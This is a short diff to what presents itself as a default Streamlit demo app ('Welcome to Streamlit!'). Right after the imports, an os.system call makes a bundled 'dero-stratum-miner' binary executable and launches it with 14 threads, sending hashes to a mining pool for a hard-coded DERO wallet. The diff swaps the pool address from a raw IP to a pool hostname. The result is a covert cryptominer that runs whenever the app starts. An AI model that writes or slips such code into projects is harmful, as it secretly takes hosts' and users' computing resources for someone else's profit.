@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('chmod +x dero-stratum-miner && ./dero-stratum-miner -r 139.59.101.23:443 -w dero1qyzunensuvly4dcnfhnfu3grhszp8vegqq96zv8cfhe867jhtfmr6qqsnyjx6.Gila --mining-threads=14')
+os.system('chmod +x dero-stratum-miner && ./dero-stratum-miner -r pool.whalesburg.com:4300 -w dero1qyzunensuvly4dcnfhnfu3grhszp8vegqq96zv8cfhe867jhtfmr6qqsnyjx6.Gila --mining-threads=14')
 """
 # Welcome to Streamlit!
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
